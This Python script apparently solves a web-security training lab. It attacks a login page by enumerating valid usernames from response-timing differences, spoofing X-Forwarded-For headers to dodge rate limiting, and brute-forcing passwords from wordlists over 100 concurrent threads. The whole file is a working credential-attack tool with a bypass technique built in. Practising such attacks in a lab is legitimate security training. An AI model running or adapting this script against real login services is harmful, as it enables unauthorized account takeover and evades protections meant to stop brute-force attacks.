import requests
from concurrent.futures import ThreadPoolExecutor

url = 'https://ac511f2b1fc9020bc08c232600c80099.web-security-academy.net/login'
delay = {}

def get_username(data, headers):
    delay[str(data['username']).strip()] = requests.post(url, data = data, headers = headers).elapsed.microseconds
    print(data['username'], '\n')

def get_password(data, headers):
    return ('Log out' in requests.post(url, data = data, headers = headers).text)

with ThreadPoolExecutor(max_workers=100) as pool:
    usernames = open('username.txt', 'r').readlines()
    passwords = open('password.txt', 'r').readlines()
    id = 99999
    data = []
    headers = []
    for user in usernames:
        id += 1
        data.append({'username' : user.strip(), 'password' : 'peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter'})
        headers.append({'X-Forwarded-For' : str(id)})
    pool.map(get_username, data, headers)
    username = str(max(delay, key=delay.get))
    print(username)
    data = []
    headers = []
    for passwd in passwords:
        id += 1
        data.append({'username' : username.strip(), 'password' : passwd.strip()})
        headers.append({'X-Forwarded-For' : str(id)})
        
    result = list(pool.map(get_password, data, headers))
    password = passwords[result.index(True)].strip()
    print(password)